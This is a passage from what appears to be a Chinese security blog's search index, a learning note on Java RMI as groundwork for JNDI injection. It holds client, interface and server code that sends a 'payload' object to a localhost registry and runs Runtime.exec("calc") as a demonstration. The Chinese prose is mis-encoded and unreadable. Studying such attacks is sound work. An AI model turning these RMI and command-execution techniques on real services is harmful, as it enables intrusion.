class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NotBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">8081</span>);<br>        <span class="hljs-type">RMITest</span> <span class="hljs-variable">rmiTest</span> <span class="hljs-operator">=</span> (RMITest) registry.lookup(<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        rmiTest.sayObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">payload</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RMITest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testcalc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayObject</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMITestImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RMITest</span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RMITestImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testcalc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayObject</span><span class="hljs-params">(Object obj)</span> &#123;<br>        System.out.println(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/RMI-JNDI/7.png" alt="7"></p><p>æŠ„äº†ä¸‹<a href="https://blog.csdn.net/uuzeray/article/details/135886709?ops_request_misc=%7B%22request_id%22:%22172199251516800186550713%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172199251516800186550713&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-135886709-null-null.nonecase&utm_term=RMI&spm=1018.2226.3001.4450">ã€å¿ƒå¾—ã€‘java JNDIé…åˆRMIå®ç°æ³¨å…¥ä¸ªäººç¬”è®°_${jndi:rmi:-CSDNåšå®¢</a>ï¼ˆæˆ‘æ˜¯æ‡’ç‹—ï¼‰</p><p>åŸç†å¾ˆç®€å•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>ã€å®šä¹‰è¿œç¨‹æ¥å£ (RMITest.java):  <br>Â· å®šä¹‰äº†ä¸€ä¸ªè¿œç¨‹æ¥å£ RMITestï¼Œå…¶ä¸­åŒ…å«ä¸¤ä¸ªæ–¹æ³• testcalc() å’Œ sayObject(Object obj)ã€‚<br>è¿™äº›æ–¹æ³•å£°æ˜æŠ›å‡º RemoteExceptionï¼Œä»¥ä¾¿åœ¨è¿œç¨‹è°ƒç”¨æ—¶å¤„ç†å¯èƒ½çš„ç½‘ç»œé—®é¢˜ã€‚<br><br><span class="hljs-number">2</span>ã€å®ç°è¿œç¨‹æ¥å£ (RMITestImpl.java):  <br>Â· RMITestImpl ç±»å®ç°äº† RMITest æ¥å£ï¼Œå¹¶ç»§æ‰¿äº† UnicastRemoteObjectï¼Œä½¿å…¶æˆä¸ºä¸€ä¸ªè¿œç¨‹å¯¹è±¡ã€‚<br>Â· åœ¨ testcalc() æ–¹æ³•ä¸­ï¼Œä½¿ç”¨ Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>) æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¼¹å‡ºè®¡ç®—å™¨ã€‚<br>Â· sayObject(Object obj) æ–¹æ³•ç®€å•åœ°æ‰“å°ä¼ å…¥çš„å¯¹è±¡ã€‚<br><br><span class="hljs-number">3</span>ã€åˆ›å»ºå¹¶å¯åŠ¨RMIæœåŠ¡å™¨ (RMIServer.java):  <br>Â· åœ¨ main æ–¹æ³•ä¸­ï¼Œåˆ›å»º RMITestImpl çš„å®ä¾‹ã€‚<br>Â· ä½¿ç”¨ LocateRegistry.createRegistry(<span class="hljs-number">8081</span>) åˆ›å»ºä¸€ä¸ªåœ¨ç«¯å£ <span class="hljs-number">8081</span> ä¸Šç›‘å¬çš„ RMI æ³¨å†Œè¡¨ã€‚<br>Â· å°† RMITestImpl å®ä¾‹ç»‘å®šåˆ°æ³¨å†Œè¡¨ä¸­ï¼Œåç§°ä¸º <span class="hljs-string">&quot;EddieMurphy&quot;</span>ã€‚<br>Â· æ‰“å°ä¸€æ¡æ¶ˆæ¯è¡¨ç¤ºæœåŠ¡å™¨æ­£åœ¨ç›‘å¬ã€‚<br><br><span class="hljs-number">4</span>ã€åˆ›å»ºå¹¶å¯åŠ¨RMIå®¢æˆ·ç«¯ (RMIClient.java):  <br>Â· åœ¨ main æ–¹æ³•ä¸­ï¼Œä½¿ç”¨ LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">8081</span>) è·å–æœåŠ¡å™¨çš„æ³¨å†Œè¡¨ã€‚<br>Â· ä½¿ç”¨ registry.lookup(<span class="hljs-string">&quot;EddieMurphy&quot;</span>) æŸ¥æ‰¾è¿œç¨‹å¯¹è±¡ï¼Œå¹¶å°†å…¶å¼ºåˆ¶è½¬æ¢ä¸º RMITest æ¥å£ã€‚<br>Â· è°ƒç”¨ rmiTest.sayObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">payload</span>()) æ–¹æ³•ï¼Œä¼ é€’ä¸€ä¸ª payload å¯¹è±¡ã€‚<br>Â· è°ƒç”¨ rmiTest.testcalc() æ–¹æ³•ï¼Œæ‰§è¡Œè¿œç¨‹æ–¹æ³•ï¼Œå¼¹å‡ºè®¡ç®—å™¨ã€‚<br></code></pre></td></tr></table></figure><p>åç»­çš„JNDIæ˜¯é‡å¤´æˆï¼Œlookupæ˜¯å…¸å‹çš„ç‰¹å¾ã€‚é‚£ä¹ˆJNDIç»“åˆRMIæ‰“æ³•å°±å…ˆç•™å¾…æŠ›ç –å¼•ç‰å§ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/prerequisites/rmi-and-jndi/rmi">RMI | Java (gitbook.io)</a></p><p><a href="https://su18.org/post/rmi-attack/">Java RMI æ”»å‡»ç”±æµ…å…¥æ·± | ç´ åå…« (su18.org)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
